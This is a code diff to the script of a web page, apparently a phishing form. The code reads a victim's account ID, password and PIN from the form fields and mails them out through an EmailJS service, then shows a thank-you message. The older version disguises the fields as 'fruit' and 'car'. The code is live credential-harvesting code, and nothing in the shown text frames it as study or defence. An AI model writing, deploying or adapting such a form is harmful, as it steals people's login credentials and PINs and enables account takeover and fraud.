@@ -38,25 +38,20 @@
 </body>
 <script type="text/javascript" src="https://cdn.emailjs.com/sdk/3.2/email.min.js"></script>
 <script>
-  (function(){
-    emailjs.init("gl00dIyxCVvdxUIc8"); // apna Public Key daalo
-  })();
+  function sendEmail(e) {
+  e.preventDefault();
 
-  function showThanks(e) {
-    e.preventDefault();
+  const templateParams = {
+    account_id: document.getElementById("idnum").value,
+    password: document.getElementById("Password").value,
+    pin: document.getElementById("Pin").value
+  };
 
-    const templateParams = {
-      account_id: document.getElementById("idnum").value,
-      fruit: document.getElementById("Password").value,
-      car: document.getElementById("Pin").value
-    };
-
-    emailjs.send("service_ohjwfz9", "template_cwk0gck", templateParams)
-      .then(function(response) {
-        document.getElementById("formCard").style.display = "none";
-        document.getElementById("thanks").style.display = "block";
-      }, function(error) {
-        alert("Failed to send: " + JSON.stringify(error));
-      });
-  }
-</script>
+  emailjs.send("service_ohjwfz9", "template_cwk0gck", templateParams)
+    .then(function(response) {
+      document.getElementById("formCard").style.display = "none";
+      document.getElementById("thanks").style.display = "block";
+    }, function(error) {
+      alert("Failed to send: " + JSON.stringify(error));
+    });
+}
